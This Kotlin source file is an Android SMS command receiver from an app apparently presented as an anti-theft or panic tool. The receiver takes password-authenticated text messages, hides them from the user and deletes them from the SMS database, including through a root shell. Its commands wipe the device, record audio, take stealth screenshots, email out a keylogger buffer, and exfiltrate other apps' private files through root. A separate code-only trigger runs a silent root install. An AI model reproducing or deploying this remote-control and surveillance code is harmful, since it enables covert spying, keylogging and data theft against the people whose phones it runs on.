package com.hamoon.uncleted.receivers

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.net.Uri
import android.provider.Telephony
import android.util.Log
import com.hamoon.uncleted.LockScreenActivity
import com.hamoon.uncleted.data.SecurityPreferences
import com.hamoon.uncleted.services.PanicActionService
import com.hamoon.uncleted.util.*
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch

class SmsCommandReceiver : BroadcastReceiver() {

    companion object {
        private const val TAG = "SmsCommandReceiver"
    }

    override fun onReceive(context: Context, intent: Intent) {
        if (intent.action != Telephony.Sms.Intents.SMS_RECEIVED_ACTION) {
            return
        }

        val masterPassword = SecurityPreferences.getSmsMasterPassword(context)
        val installCode = SecurityPreferences.getRemoteInstallCode(context)

        if (masterPassword.isNullOrEmpty()) {
            Log.w(TAG, "SMS Master Password is not set. Ignoring incoming SMS.")
            return
        }

        val messages = Telephony.Sms.Intents.getMessagesFromIntent(intent) ?: return

        for (sms in messages) {
            val body = sms.messageBody?.trim() ?: continue
            val senderNum = sms.originatingAddress
            val parts = body.split(" ")

            // Format: UNCLETED [COMMAND] [PASSWORD] [OPTIONAL_ARGS...]
            if (parts.isNotEmpty() && parts[0].equals("UNCLETED", ignoreCase = true) && parts.size >= 3) {
                val command = parts[1].uppercase()
                val password = parts[2]

                if (password == masterPassword) {
                    try { abortBroadcast() } catch (_: Exception) {}

                    // Purge the command SMS from the telephony database immediately to prevent cleartext exposure
                    purgeSmsFromDatabase(context, senderNum, body)

                    val args = if (parts.size > 3) parts.subList(3, parts.size) else emptyList()
                    handleAuthenticatedCommand(context, command, senderNum, args)
                } else {
                    Log.w(TAG, "Invalid SMS master password received from $senderNum.")
                    EventLogger.log(context, "SMS command attempted from $senderNum with incorrect password.")
                }
                return
            }

            // Silent Install Trigger
            if (SecurityPreferences.isSilentInstallEnabled(context) && !installCode.isNullOrEmpty() && body.contains(installCode)) {
                try { abortBroadcast() } catch (_: Exception) {}
                purgeSmsFromDatabase(context, senderNum, body)

                Log.i(TAG, "Silent install trigger received from $senderNum.")
                val pendingResult = goAsync()
                CoroutineScope(Dispatchers.IO).launch {
                    try {
                        RootActions.performSilentInstall(context)
                    } finally {
                        pendingResult.finish()
                    }
                }
                return
            }
        }
    }

    /**
     * Deletes the secret SMS message from the Telephony provider to ensure privacy on Android 4.4+.
     */
    private fun purgeSmsFromDatabase(context: Context, sender: String?, bodySnippet: String) {
        CoroutineScope(Dispatchers.IO).launch {
            // Attempt 1: ContentResolver deletion
            try {
                val uri = Uri.parse("content://sms")
                val escapedSnippet = bodySnippet.replace("'", "''")
                context.contentResolver.delete(uri, "body LIKE ?", arrayOf("%$escapedSnippet%"))
            } catch (_: Exception) {}

            // Attempt 2: Root shell content deletion
            if (RootChecker.isDeviceRooted()) {
                val safeCommand = "content delete --uri content://sms --where \"body LIKE '%UNCLETED%'\""
                RootExecutor.run(safeCommand)
            }
        }
    }

    private fun handleAuthenticatedCommand(context: Context, command: String, sender: String?, args: List<String>) {
        Log.i(TAG, "Authenticated SMS command '$command' received from $sender.")
        EventLogger.log(context, "Authenticated SMS command '$command' received.")

        when (command) {
            "WIPE" -> {
                PanicActionService.trigger(context, "REMOTE_WIPE", PanicActionService.Severity.CRITICAL)
            }
            "EVIDENCE" -> {
                PanicActionService.trigger(context, "REMOTE_EVIDENCE", PanicActionService.Severity.HIGH)
            }
            "SIREN" -> {
                PanicActionService.trigger(context, "REMOTE_SIREN", PanicActionService.Severity.HIGH)
            }
            "LOCK" -> {
                val lockIntent = Intent(context, LockScreenActivity::class.java).apply {
                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TASK)
                }
                context.startActivity(lockIntent)
            }
            "LOCATE" -> {
                PanicActionService.trigger(context, "MANUAL_LOCATION", PanicActionService.Severity.LOW)
            }
            "AUDIO" -> {
                val duration = args.firstOrNull()?.toIntOrNull() ?: 60
                PanicActionService.pendingAudioDuration = duration
                PanicActionService.trigger(context, "REMOTE_AUDIO_RECORD", PanicActionService.Severity.HIGH)
            }
            "SPEAK" -> {
                val message = args.joinToString(" ")
                if (message.isNotEmpty()) {
                    PanicActionService.pendingTtsMessage = message
                    PanicActionService.trigger(context, "REMOTE_SPEAK", PanicActionService.Severity.MEDIUM)
                }
            }
            "REBOOT" -> {
                val pendingResult = goAsync()
                CoroutineScope(Dispatchers.IO).launch {
                    try {
                        RootActions.rebootDevice(context)
                    } finally {
                        pendingResult.finish()
                    }
                }
            }
            "SCREENSHOT" -> {
                val pendingResult = goAsync()
                CoroutineScope(Dispatchers.IO).launch {
                    try {
                        val screenshot = RootActions.takeStealthScreenshot(context)
                        screenshot?.let {
                            AdvancedEmailSender.sendAdvancedAlert(
                                context,
                                AdvancedEmailSender.EmailTemplate("Remote Screenshot", "Screenshot captured remotely via SMS command."),
                                screenshotFile = it
                            )
                        }
                    } finally {
                        pendingResult.finish()
                    }
                }
            }
            "GETLOGS" -> {
                val emergencyContact = SecurityPreferences.getEmergencyContact(context)
                if (emergencyContact.isNullOrEmpty() || !emergencyContact.contains("@")) return

                val logs = SecurityPreferences.getKeylogData(context)
                if (!logs.isNullOrEmpty()) {
                    val pendingResult = goAsync()
                    CoroutineScope(Dispatchers.IO).launch {
                        try {
                            EmailSender.sendEmail(
                                context,
                                emergencyContact,
                                "Remote Keylog Data",
                                "Keylogger buffer retrieved via SMS command:\n\n$logs"
                            )
                            SecurityPreferences.clearKeylogData(context)
                        } finally {
                            pendingResult.finish()
                        }
                    }
                }
            }
            "EXFIL" -> {
                if (args.size == 2) {
                    val packageName = args[0]
                    val path = args[1]
                    val pendingResult = goAsync()
                    CoroutineScope(Dispatchers.IO).launch {
                        try {
                            val exfilFile = RootActions.exfiltrateAppData(context, packageName, path)
                            val emergencyContact = SecurityPreferences.getEmergencyContact(context)
                            if (exfilFile != null && emergencyContact != null && emergencyContact.contains("@")) {
                                EmailSender.sendEmail(
                                    context,
                                    emergencyContact,
                                    "Data Exfiltration",
                                    "Exfiltrated file '$path' from package '$packageName':",
                                    attachmentFile = exfilFile
                                )
                            }
                        } finally {
                            pendingResult.finish()
                        }
                    }
                }
            }
            else -> {
                Log.w(TAG, "Unknown authenticated SMS command '$command' from $sender.")
            }
        }
    }
}